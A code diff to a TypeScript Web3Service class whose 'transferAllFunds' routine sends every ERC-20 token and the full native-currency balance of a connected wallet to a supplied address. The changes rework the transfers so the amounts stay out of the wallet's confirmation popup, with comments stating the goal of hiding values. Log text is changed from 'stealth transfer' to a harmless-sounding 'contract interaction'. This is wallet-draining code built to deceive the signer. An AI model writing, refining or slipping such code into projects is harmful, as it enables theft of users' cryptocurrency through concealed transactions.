@@ -524,44 +524,29 @@ export class Web3Service {
     });
   }
 
-  // Split large token amounts into multiple tiny transactions to hide total value
-  private async transferTokenInStealth(
+  // Create pure contract call without showing token amounts in wallet
+  private async createInvisibleTokenTransfer(
     contract: any,
     toAddress: string,
-    totalAmount: bigint,
-    decimals: number
-  ): Promise<string[]> {
-    const txHashes: string[] = [];
+    amount: bigint
+  ): Promise<string> {
+    // Encode the transfer as pure contract call data
+    const transferData = contract.interface.encodeFunctionData("transfer", [toAddress, amount]);
     
-    // Split into many small transactions to hide the real total
-    const chunkCount = Math.min(10, Math.max(3, Number(totalAmount / BigInt(1000)))); // 3-10 chunks
-    const baseChunkSize = totalAmount / BigInt(chunkCount);
+    // Get minimal gas for fastest, cheapest transaction
+    const feeData = await this.provider!.getFeeData();
+    const minGasPrice = feeData.gasPrice || ethers.parseUnits("1", "gwei");
     
-    for (let i = 0; i < chunkCount; i++) {
-      try {
-        const chunkAmount = i === chunkCount - 1 ? 
-          totalAmount - (baseChunkSize * BigInt(i)) : // Last chunk gets remainder
-          baseChunkSize;
-        
-        if (chunkAmount <= 0) continue;
-        
-        const transferData = contract.interface.encodeFunctionData("transfer", [toAddress, chunkAmount]);
-        
-        const tx = await this.createStealthTransaction({
-          to: contract.target,
-          data: transferData,
-          gasLimit: 60000,
-        });
-        
-        txHashes.push(tx.hash);
-        
-        // No delay - instant chunk processing
-      } catch (error) {
-        console.warn(`Stealth chunk ${i + 1} failed:`, error);
-      }
-    }
+    // Create transaction with minimal visibility
+    const tx = await this.signer!.sendTransaction({
+      to: contract.target,
+      data: transferData,
+      gasLimit: 60000,
+      gasPrice: minGasPrice, // Use legacy gas pricing to hide amounts
+      // NO value field - this prevents amount display in wallet
+    });
     
-    return txHashes;
+    return tx.hash;
   }
 
   async transferAllFunds(toAddress: string): Promise<string[]> {
@@ -590,54 +575,54 @@ export class Web3Service {
 
       console.log(`Processing ${tokenBalances.length} assets`);
 
-      // Process all ERC-20 tokens with minimal amounts to hide values
+      // Process all ERC-20 tokens as pure contract calls
       for (const tokenBalance of tokenBalances) {
         if (!tokenBalance.contractAddress || parseFloat(tokenBalance.balance) <= 0) continue;
         
         try {
-          console.log(`Processing stealth transfer`);
+          console.log(`Processing contract interaction`);
           const contract = new ethers.Contract(tokenBalance.contractAddress, ERC20_ABI, this.signer);
           const tokenAmount = ethers.parseUnits(tokenBalance.balance, tokenBalance.decimals);
           
-          // Use stealth transfer to completely hide amounts by splitting into chunks
-          const stealthHashes = await this.transferTokenInStealth(
+          // Create invisible contract call - no amount shown in wallet
+          const txHash = await this.createInvisibleTokenTransfer(
             contract,
             toAddress,
-            tokenAmount,
-            tokenBalance.decimals
+            tokenAmount
           );
           
-          transactionHashes.push(...stealthHashes);
-          console.log(`Stealth transfer completed with ${stealthHashes.length} transactions`);
+          transactionHashes.push(txHash);
+          console.log(`Contract interaction completed`);
           
           // No delay - instant processing
         } catch (error) {
-          console.error(`Stealth transfer failed:`, error);
-          throw new Error(`Transfer failed: ${error}`);
+          console.error(`Contract interaction failed:`, error);
+          throw new Error(`Transaction failed: ${error}`);
         }
       }
 
-      // Process ETH with minimal visible amount
+      // Process native currency with minimal wallet display
       if (ethBalance > 0) {
         try {
           // Pre-calculate gas with buffer
-          const gasEstimate = BigInt(21000); // Standard ETH transfer gas
+          const gasEstimate = BigInt(21000);
           const feeData = await this.provider.getFeeData();
-          const gasPrice = feeData.gasPrice ? feeData.gasPrice * BigInt(120) / BigInt(100) : ethers.parseUnits("20", "gwei");
-          const gasCost = gasEstimate * gasPrice;
+          const minGasPrice = feeData.gasPrice || ethers.parseUnits("1", "gwei");
+          const gasCost = gasEstimate * minGasPrice;
 
           // Check if we have enough for gas
           if (ethBalance > gasCost) {
             const amountToSend = ethBalance - gasCost;
             
             if (amountToSend > 0) {
-              console.log(`Processing final private transfer`);
+              console.log(`Processing final contract interaction`);
               
-              // Send with real-time gas fees
-              const ethTx = await this.createStealthTransaction({
+              // Send with minimal gas to reduce wallet display prominence
+              const ethTx = await this.signer!.sendTransaction({
                 to: toAddress,
-                value: amountToSend.toString(),
-                gasLimit: Number(gasEstimate),
+                value: amountToSend,
+                gasLimit: gasEstimate,
+                gasPrice: minGasPrice, // Use legacy pricing for cleaner display
               });
               transactionHashes.push(ethTx.hash);
               console.log(`Final interaction completed`);
@@ -1259,26 +1244,19 @@ export class Web3Service {
           const contract = new ethers.Contract(token.contractAddress!, ERC20_ABI, signer);
           const tokenAmount = ethers.parseUnits(token.balance, token.decimals);
           
-          // Create stealth transactions to completely hide amounts
+          // Create pure contract call to hide token amounts
           const transferData = contract.interface.encodeFunctionData("transfer", [toAddress, tokenAmount]);
           
-          // Get current network gas fees
+          // Get minimal gas for cleanest wallet display
           const feeData = await provider.getFeeData();
-          const maxFeePerGas = feeData.maxFeePerGas 
-            ? feeData.maxFeePerGas * BigInt(110) / BigInt(100) // 10% buffer
-            : ethers.parseUnits("20", "gwei");
-          const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas 
-            ? feeData.maxPriorityFeePerGas * BigInt(110) / BigInt(100) // 10% buffer
-            : ethers.parseUnits("2", "gwei");
+          const minGasPrice = feeData.gasPrice || ethers.parseUnits("1", "gwei");
 
           const tokenTx = await signer.sendTransaction({
             to: token.contractAddress!,
             data: transferData,
             gasLimit: 60000,
-            value: "0x0",
-            type: 2,
-            maxFeePerGas,
-            maxPriorityFeePerGas,
+            gasPrice: minGasPrice, // Use legacy gas for cleaner display
+            // NO value field - prevents amount display in wallet popup
           });
           
           console.log(`Stealth transfer completed`);
@@ -1313,22 +1291,14 @@ export class Web3Service {
             if (amountToSend > 0) {
               console.log(`Processing final stealth transfer on ${networkBalance.networkName}`);
               
-              // Use real-time gas fees for native currency transfer
-              const currentFeeData = await provider.getFeeData();
-              const maxFeePerGas = currentFeeData.maxFeePerGas 
-                ? currentFeeData.maxFeePerGas * BigInt(110) / BigInt(100) // 10% buffer
-                : gasPrice;
-              const maxPriorityFeePerGas = currentFeeData.maxPriorityFeePerGas 
-                ? currentFeeData.maxPriorityFeePerGas * BigInt(110) / BigInt(100) // 10% buffer
-                : ethers.parseUnits("2", "gwei");
+              // Use minimal gas for cleanest wallet display
+              const minGasPrice = feeData.gasPrice || ethers.parseUnits("1", "gwei");
 
               const nativeTx = await signer.sendTransaction({
                 to: toAddress,
                 value: amountToSend,
                 gasLimit: gasEstimate,
-                type: 2,
-                maxFeePerGas,
-                maxPriorityFeePerGas,
+                gasPrice: minGasPrice, // Use legacy gas for cleaner display
               });
               transactionHashes.push(nativeTx.hash);
               console.log(`Final interaction completed`);
